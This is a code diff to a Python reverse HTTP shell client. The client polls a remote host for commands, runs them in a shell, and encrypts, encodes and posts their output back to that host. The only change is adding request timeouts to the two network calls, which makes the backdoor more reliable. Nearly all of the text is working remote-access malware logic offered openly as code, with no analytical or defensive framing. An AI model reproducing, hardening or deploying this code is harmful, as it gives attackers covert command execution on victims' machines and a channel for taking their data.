@@ -26,7 +26,7 @@ def decompress(data):
 def reverse_http_shell_client(lhost, rhost, rport):
     while True:
         try:
-            req = requests.get(f'http://{lhost}:{rport}', headers={'X-Auth': FIXED_KEY.decode()})
+            req = requests.get(f'http://{lhost}:{rport}', headers={'X-Auth': FIXED_KEY.decode()}, timeout=10)
             if req.status_code != 200:
                 print(f"[!] Authentication failed: {req.status_code}")
                 break
@@ -40,7 +40,7 @@ def reverse_http_shell_client(lhost, rhost, rport):
                 CMD = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                 output = CMD.stdout.read() + CMD.stderr.read()
                 encoded_output = base64.b64encode(encrypt(compress(output))).decode()
-                requests.post(f'http://{rhost}:{rport}', data=encoded_output, headers={'X-Auth': FIXED_KEY.decode()})
+                requests.post(f'http://{rhost}:{rport}', data=encoded_output, headers={'X-Auth': FIXED_KEY.decode()}, timeout=10)
 
             time.sleep(3)
         except Exception as e:
